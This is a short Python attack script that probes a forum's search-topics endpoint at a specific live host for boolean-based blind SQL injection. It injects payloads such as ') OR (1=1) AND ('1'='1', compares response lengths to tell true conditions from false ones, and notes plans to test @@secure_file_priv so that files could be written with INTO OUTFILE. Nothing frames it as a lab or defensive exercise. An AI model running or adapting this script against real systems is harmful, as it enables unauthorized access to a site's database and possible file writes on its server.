import requests
import re

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"

session = requests.Session()

def test(payload):
    url = f"{BASE_URL}/forums/search-topics?search=') OR ({payload}) AND ('1'='1"
    r = session.get(url)
    return len(r.text) # Return length for manual inspection

def main():
    # Test for FILE privilege
    # Current user
    # SELECT user, file_priv FROM mysql.user WHERE user = (SELECT current_user())
    
    # Simple check: can we write to a file in a known writable directory?
    # Actually, we can check if @@secure_file_priv is NULL or empty
    print("[*] Checking @@secure_file_priv...")
    # If @@secure_file_priv is NULL, INTO OUTFILE is disabled.
    # If empty, it's enabled for all.
    # If a path, it's enabled for that path.
    
    # Test: length of @@secure_file_priv
    # payload = "(SELECT LENGTH(@@secure_file_priv))>0"
    
    # Let's try to find a condition that changes response length
    l_true = test("1=1")
    l_false = test("1=0")
    print(f"L_TRUE: {l_true}, L_FALSE: {l_false}")
    
    if l_true == l_false:
        print("[-] SQLi not working with currently known method. Trying different search term.")
        # Try search with actual results to see difference
        # Scrape a tag name from first search
        r = session.get(f"{BASE_URL}/forums/search-topics")
        tag_match = re.search(r'/forums/search-topics\?search=([^"]+)', r.text)
        if tag_match:
            tag = tag_match.group(1)
            print(f"[*] Found tag: {tag}")
            l_tag = test(f"forum_topics.title LIKE '%{tag}%'")
            print(f"L_TAG '{tag}': {l_tag}")
            
            # Now try boolean with this tag
            l_bool_t = test(f"forum_topics.title LIKE '%{tag}%' AND 1=1")
            l_bool_f = test(f"forum_topics.title LIKE '%{tag}%' AND 1=0")
            print(f"L_BOOL_T: {l_bool_t}, L_BOOL_F: {l_bool_f}")

if __name__ == "__main__":
    main()
